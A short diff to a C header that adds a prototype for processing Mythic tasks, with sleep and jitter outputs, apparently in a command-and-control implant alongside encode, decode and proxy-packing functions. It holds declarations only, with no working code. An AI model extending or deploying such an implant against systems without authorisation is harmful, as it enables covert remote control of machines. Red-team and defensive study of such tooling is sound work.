@@ -100,6 +100,9 @@ int s0_mythic_encode(const char *uuid, const uint8_t key[32],
                      const void *json, uint32_t json_len, s0_buffer *out);
 int s0_mythic_decode(const uint8_t key[32], const void *encoded,
                      uint32_t encoded_len, char uuid[37], s0_buffer *json);
+int s0_process_mythic_tasks(const uint8_t *json, uint32_t json_len,
+                            uint16_t *sleep_ms, uint16_t *jitter_pct,
+                            s0_buffer *response_json);
 int s0_proxy_pack(uint8_t kind, uint32_t server_id, uint32_t port,
                   int exit_flag, const void *data, uint32_t length,
                   s0_buffer *out);
